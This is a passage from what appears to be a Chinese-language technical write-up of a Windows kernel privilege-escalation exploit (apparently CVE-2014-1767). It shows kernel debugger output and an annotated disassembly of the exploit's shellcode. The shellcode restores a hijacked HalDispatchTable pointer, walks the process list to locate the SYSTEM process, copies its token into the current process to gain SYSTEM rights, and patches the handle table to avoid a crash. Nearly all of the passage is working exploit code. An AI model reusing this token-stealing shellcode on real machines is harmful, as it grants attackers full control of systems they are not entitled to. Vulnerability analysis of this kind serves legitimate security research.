eip=00020705 esp=8e7f5bcc ebp=8e7f5bf0 iopl=0         nv up ei pl nz na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000206
00020705 90              nop
kd> 
eax=8e7f5be0 ebx=8411ce01 ecx=01af4c38 edx=8411ce6b esi=01af4c38 edi=00001337
eip=00020706 esp=8e7f5bcc ebp=8e7f5bf0 iopl=0         nv up ei pl nz na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000206
00020706 31c0            xor     eax,eax
```

成功以内核权限执行用户态的shellcode，下面着重分析下shellcode的提权部分：

```
00020704 90              nop                                   //恢复函数指针，避免BSOD
00020705 90              nop
00020706 31c0            xor     eax,eax
00020708 b8a278e283      mov     eax,offset hal!HaliQuerySystemInformation (83e278a2)
0002070d a3fc23f683      mov     dword ptr [nt!HalDispatchTable+0x4 (83f623fc)],eax
00020712 52              push    edx
00020713 53              push    ebx
00020714 33c0            xor     eax,eax                       //修改Token
00020716 648b8024010000  mov     eax,dword ptr fs:[eax+124h]   //获取线程的_KTHREAD结构
0002071d 8b4050          mov     eax,dword ptr [eax+50h]       //获得当前进程_EPROCESS结构地址
00020720 8bc8            mov     ecx,eax                       //ecx保存_KPROCESS结构地址
00020722 8b98f8000000    mov     ebx,dword ptr [eax+0F8h]      //ebx指向进程Token
00020728 891d00090200    mov     dword ptr ds:[20900h],ebx     //保存当前进程Token
0002072e 8b80b8000000    mov     eax,dword ptr [eax+0B8h]      //开始遍历活动进程链表
00020734 81e8b8000000    sub     eax,0B8h                      //获得新进程的_EPROCESS地址
0002073a 81b8b400000004000000 cmp dword ptr [eax+0B4h],4       //判断是否是system进程
00020744 75e8            jne     0002072e
00020746 8b90f8000000    mov     edx,dword ptr [eax+0F8h]      //获得system进程Token地址
0002074c 8bc1            mov     eax,ecx                       //eax恢复当前进程_KPROCESS地址
0002074e 8990f8000000    mov     dword ptr [eax+0F8h],edx      //将当前进程Token指针指向system Token，提权
00020754 33c0            xor     eax,eax                       //修复对象
00020756 648b8024010000  mov     eax,dword ptr fs:[eax+124h]
0002075d 8b4050          mov     eax,dword ptr [eax+50h]       //获得当前进程_EPROCESS地址
00020760 8b80f4000000    mov     eax,dword ptr [eax+0F4h]      //得到句柄表指针
00020766 8bd8            mov     ebx,eax                       //关于句柄表有篇文章讲得很好
00020768 8b00            mov     eax,dword ptr [eax]                 
0002076a 8b0da84aaf01    mov     ecx,dword ptr ds:[1AF4AA8h]
00020770 83e1fc          and     ecx,0FFFFFFFCh
00020773 03c9            add     ecx,ecx
00020775 03c1            add     eax,ecx
00020777 c70000000000    mov     dword ptr [eax],0
0002077d 83c330          add     ebx,30h
00020780 8bc3            mov     eax,ebx
00020782 8b1b            mov     ebx,dword ptr [ebx]
00020784 83eb01          sub     ebx,1
00020787 8918            mov     dword ptr [eax],ebx
00020789 5b              pop     ebx
0002078a 5a              pop     edx
0002078b c21000          ret     10h
```

![图片8](https://turingsec.github.io/knowledge/posts/windows_eop_cve-2014-1767/图片8.png)